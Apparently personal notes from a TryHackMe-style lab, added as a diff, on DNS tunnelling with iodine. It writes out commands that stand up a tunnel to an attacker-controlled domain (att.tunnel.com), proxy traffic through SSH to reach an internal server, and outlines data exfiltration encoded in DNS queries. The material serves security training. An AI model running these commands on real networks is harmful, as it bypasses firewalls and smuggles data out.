@@ -1,0 +1,48 @@
+iodine: Creates DNS tunneling communications
+Source: https://github.com/yarrick/iodine
+
+DNS Tunneling (TCPoverDNS):
+                                                  We will apply the technique to the network infrastructure to pivot from Network 2 to 
+                                                  Network 1 and access the internal web server. 
+sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com 
+                                                  Run the server-side application (`iodined`)
+                                                  Ensure to execute the command with `sudo`. The `iodined` creates a new network interface (`dns0`) for the tunneling over the DNS.
+sudo iodine -P thmpass att.tunnel.com             On the JumpBox machine, we need to connect to the server-side application
+                                                  Note that we executed the client-side tool (`iodine`) and provided the `-f` and `-P` arguments explained before
+ssh thm@10.1.1.2 -4 -f -N -D 1080                 Once the connection is established, log in to `10.1.1.1` via `SSH`. Note that all communication over the network
+                                                  `10.1.1.1/24` will be over the `DNS`. We will be using the `-D` argument for the dynamic port forwarding feature
+                                                  to use the SSH session as a proxy. Note that we used the `-f` argument to enforce ssh to go to the background
+                                                  The `-4` argument forces the ssh client to bind on IPv4 only.
+proxychains curl http://192.168.0.100/demo.php    Now that we have connected to JumpBox over the `dns0` network, use `ProxyChains` or Firefox with `127.0.0.1`
+or                                                and port `1080` as proxy settings
+curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php  
+
+Options:
+-f       Argument is to run the server in the foreground
+-c       Argument is to skip checking the client IP address and port for each DNS request
+-P       Argument is to set a password for authentication
+10.1.1.1/24
+         Argument is to set the network IP for the new network interface (`dns0`).
+         The IP address of the server will be `10.1.1.1` and the client `10.1.1.2`.
+         `att.tunnel.com` is the nameserver we previously set.
+
+To establish DNS tunneling, we need to follow the following steps:
+  1. Ensure to update the DNS records and create new NS points to your AttackBox machine, or you can use the preconfigured nameserver, 
+     which points to the Attacker machine (att.tunnel.com=172.20.0.200)
+  2. Run `iodined` server from AttackBox or the Attacker machine. (note for the server side we use `iodined`)
+  3. On JumpBox, run the `iodine` client to establish the connection. (note for the client side we use `iodine` - without `d`)
+  4. SSH to the machine on the created network interface to create a proxy over DNS. We will be using the `-D` argument to create a dynamic port forwarding.
+  5. Once an SSH connection is established, we can use the local IP and the local port as a proxy in Firefox or `ProxyChains`.
+
+We need to use the DNS Data Exfiltration when the firewall blocks and filters all traffic. We can 
+pass data or TCP/UDP packets through a firewall using the DNS protocol, but it is important
+to ensure that the DNS is allowed and resolving domain names to IP addresses.
+
+Data Exfiltration over DNS requirements and steps:
+ 	1. An attacker registers a domain name, for example, tunnel.com (you need to control a domain name and set up DNS records, including NS, A, or TXT)
+ 	2. The attacker sets up tunnel.com's NS record points to a server that the attacker controls.
+ 	3. The malware or the attacker sends sensitive data from a victim machine to a domain name they
+  control—for example, passw0rd.tunnel.com, where passw0rd is the data that needs to be transferred.
+ 	4. The DNS request is sent through the local DNS server and is forwarded through the Internet.
+ 	5. The attacker's authoritative DNS (malicious server) receives the DNS request.
+ 	6. Finally, the attacker extracts the password from the domain name.
